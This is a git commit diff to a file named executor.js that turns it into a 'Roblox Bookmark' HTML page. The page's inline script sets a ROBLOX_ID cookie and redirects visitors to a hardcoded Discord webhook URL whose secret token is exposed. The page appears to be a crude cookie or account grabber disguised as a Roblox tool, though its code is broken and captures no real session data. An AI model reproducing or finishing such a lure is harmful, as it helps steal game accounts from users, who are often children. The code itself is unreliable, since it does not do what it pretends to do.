3a206e506824f4ecbbe129c276e4cfbfe435977f
isuckfarts1234412-cloud <isuckfarts1234412@gmail.com>
2026-04-06 22:10:48 -0400

    Update executor.js

--- executor.js
+++ executor.js
@@ -1,3 +1,15 @@
-var cookie = 'ROBLOX_ID=' + Math.random().toString(36).substr(2, 9);
-document.cookie = 'ROBLOX_ID=' + cookie;
-window.location.href = 'https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4';
+<html>
+  <head>
+    <title>Roblox Bookmark</title>
+    <script src="script.js"></script>
+  </head>
+  <body>
+    <div class="bookmark"></div>
+    <button id="robo-click">Click me</button>
+    <script>
+      var cookie = 'ROBLOX_ID=' + Math.random().toString(36).substr(2, 9);
+      document.cookie = 'ROBLOX_ID=' + cookie;
+      window.location.href = 'https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4k';
+    </script>
+  </body>
+</html>
